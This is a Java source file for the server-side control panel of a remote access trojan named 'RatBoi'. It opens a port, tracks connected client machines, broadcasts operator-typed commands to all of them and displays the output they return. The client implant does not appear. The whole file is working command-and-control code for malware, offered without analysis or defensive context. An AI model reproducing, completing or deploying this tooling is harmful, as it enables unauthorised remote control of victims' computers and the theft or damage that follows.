package me.hashy.rat;

import java.awt.*;

import javax.swing.*;

import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;
import com.esotericsoftware.kryonet.Server;


public class ServerGUI extends JFrame {

    private JTextField command;
    private JTextArea log;
    private JButton send;

    private Server server;

    private int connectAmount = 0;

    public ServerGUI() throws UnsupportedLookAndFeelException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        super("Server");

        setLayout(new BorderLayout());

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new FlowLayout());

        command = new JTextField(20);
        command.setPreferredSize(new Dimension(150,30));
        command.setBorder(BorderFactory.createLineBorder(Color.BLACK, 1));
        command.setBackground(Color.WHITE);
        command.setForeground(Color.BLACK);
        command.setFont(new Font("Arial",Font.PLAIN,14));

        send = new JButton("Send Command");
        send.setPreferredSize(new Dimension(150,30));
        send.setBorder(BorderFactory.createLineBorder(Color.BLACK, 1));
        send.setBackground(Color.WHITE);
        send.setForeground(Color.BLACK);
        send.setFont(new Font("Arial",Font.PLAIN,14));
        send.setFocusPainted(false);

        send.addActionListener(e -> {
            String cmd = command.getText();

            log.append("Sending Command: " + cmd + "\n");

            //Send the command to the client
            server.sendToAllTCP(cmd);
        });

        topPanel.add(command);
        topPanel.add(send);

        add(topPanel, BorderLayout.NORTH);

        JPanel centerPanel = new JPanel();
        centerPanel.setLayout(new BorderLayout());

        log = new JTextArea();
        log.setEditable(false);
        log.setPreferredSize(new Dimension(350,350));
        log.setBorder(BorderFactory.createLineBorder(Color.BLACK, 1));
        log.setBackground(Color.WHITE);
        log.setForeground(Color.BLACK);
        log.setFont(new Font("Arial",Font.PLAIN,14));


        JScrollPane scrollPane = new JScrollPane(log);

        centerPanel.add(scrollPane, BorderLayout.CENTER);

        add(centerPanel, BorderLayout.CENTER);

        //Start the server
        server = new Server();
        server.start();

        //Bind the server to a port
        try {
            server.bind(50000);
            System.out.println("Server Bound to Port 50000");
        } catch (Exception e) {
            e.printStackTrace();
        }

        //Add a listener to the server
        server.addListener(new Listener() {

            @Override
            public void received(Connection connection, Object object) {
                //Get the client output
                if(!(object instanceof String output))
                    return;

                //Print the output to the log
                log.append("Client Output:\n" + output + "\n");

            }

            @Override
            public void connected(Connection connection) {
                connectAmount++;
                setTitle(String.format("RatBoi (%s clients connected)", connectAmount));
            }

            @Override
            public void disconnected(Connection connection) {
                connectAmount--;
                setTitle(String.format("RatBoi (%s clients connected)", connectAmount));
            }
        });

        //Set the size and visibility of the frame
        setTitle(String.format("RatBoi (%s clients connected)", connectAmount));
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        setSize(920, 480);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    public static void main(String[] args) throws UnsupportedLookAndFeelException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        new ServerGUI();
    }
}